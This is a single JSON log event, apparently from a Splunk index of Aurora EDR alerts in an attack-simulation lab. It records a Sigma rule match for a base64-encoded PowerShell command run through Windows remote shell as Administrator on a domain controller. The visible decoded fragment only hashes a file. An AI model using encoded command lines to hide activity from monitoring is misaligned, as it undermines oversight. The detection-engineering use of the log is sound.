dABoACkACgB9AAoAZQBuAGQAIAB7AAoAJABzAGgAYQAxAC4AVAByAGEAbgBzAGYAbwByAG0ARgBpAG4AYQBsAEIAbABvAGMAawAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAwACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAJABoAGEAcwBoACAAPQAgAFsAUwB5AHMAdABlAG0ALgBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBUAG8AUwB0AHIAaQBuAGcAKAAkAHMAaABhADEALgBIAGEAcwBoACkALgBSAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAIgApAC4AVABvAEwAbwB3AGUAcgBJAG4AdgBhAHIAaQBhAG4AdAAoACkACgAkAGYAZAAuAEMAbABvAHMAZQAoACkACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAewAiACIAcwBoAGEAMQAiACIAOgAiACIAJABoAGEAcwBoACIAIgB9ACIACgB9AA==\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304740\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"288\",\"Image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw in CommandLine\",\"Module\":\"Sigma\",\"NewProcessId\":\"4816\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\winrshost.exe\",\"ProcessId\":\"4712\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a base64 encoded FromBase64String keyword in a process command line\",\"Rule_FalsePositives\":\"Unknown\",\"Rule_Id\":\"fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c\",\"Rule_Level\":\"critical\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_encoded_frombase64string.yml\",\"Rule_Modified\":\"2022/03/07\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_encoded_frombase64string.yml\",\"Rule_References\":\"\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Encoded FromBase64String\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0xede69\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:09:54.8593382Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"alert\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:05Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":["nix-all-logs","nix_errors"],"host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\":\\\\\\\\\\\\._/__-_-_-__-_==\",\"\":\"----..\",\"\":\"\",\"\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","tag":"error","tag::eventtype":"error","timestamp":"none"}}
